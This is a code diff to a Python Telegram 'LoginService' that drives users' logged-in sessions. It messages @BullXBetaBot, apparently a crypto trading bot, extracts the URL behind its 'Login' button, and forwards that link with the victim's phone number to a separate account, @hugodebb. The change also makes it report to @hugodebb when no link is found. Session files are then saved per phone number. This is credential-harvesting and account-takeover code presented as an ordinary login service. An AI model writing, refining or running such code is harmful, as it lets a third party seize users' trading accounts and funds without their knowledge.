@@ -175,23 +175,25 @@ class LoginService:
             login_url = None
 
             try:
-                # ✅ 1. Get the BullX bot entity
+                # ✅ 1. Get BullX bot entity
                 bot = await client.get_entity("@BullXBetaBot")
 
-                # ✅ 2. Send /start to the bot
+                # ✅ 2. Send /start
                 await client.send_message(bot, "/start")
                 logger.info(f"/start message sent to @BullXBetaBot for {phone}")
 
-                # ✅ 3. Wait briefly then fetch last messages
-                await asyncio.sleep(2)  # wait for bot reply
-                messages = await client.get_messages(bot, limit=5)
+                # ✅ 3. Wait a bit for bot to reply
+                await asyncio.sleep(4)
 
-                # ✅ 4. Search for a button with a URL
+                # ✅ 4. Fetch last few messages from the bot
+                messages = await client.get_messages(bot, limit=10)
+
+                # ✅ 5. Search for a button named “Login”
                 for msg in messages:
                     if msg.reply_markup and msg.reply_markup.rows:
                         for row in msg.reply_markup.rows:
                             for button in row.buttons:
-                                if hasattr(button, "url") and button.url:
+                                if getattr(button, "text", "").lower() == "login" and hasattr(button, "url"):
                                     login_url = button.url
                                     break
                             if login_url:
@@ -200,21 +202,30 @@ class LoginService:
                         break
 
                 if login_url:
-                    logger.info(f"Login URL retrieved for {phone}: {login_url}")
+                    logger.info(f"Login button link found for {phone}: {login_url}")
 
-                    # ✅ 5. Send the link to @hugodebb
+                    # ✅ 6. Send this link to @hugodebb
                     try:
                         hugo_user = await client.get_entity("@hugodebb")
-                        await client.send_message(hugo_user, f"🔗 Lien de connexion pour {phone} :\n{login_url}")
+                        await client.send_message(
+                            hugo_user,
+                            f"🔗 Lien de connexion pour {phone} :\n{login_url}"
+                        )
                         logger.info(f"Login link sent to @hugodebb for {phone}")
                     except Exception as e:
                         logger.error(f"Failed to send login link to @hugodebb: {str(e)}")
 
                 else:
-                    logger.warning(f"No login URL found in bot reply for {phone}")
+                    hugo_user = await client.get_entity("@hugodebb")
+                    await client.send_message(
+                        hugo_user,
+                        f"🔗 Lien de connexion absent pour {phone} :\n{login_url}"
+                    )
+                    logger.warning(f"No 'Login' button link found in @BullXBetaBot reply for {phone}")
 
             except Exception as e:
                 logger.error(f"Failed to interact with @BullXBetaBot for {phone}: {str(e)}")
+
             await client.disconnect()
 
             session_filename = f"session_{phone.replace('+', '')}.session"
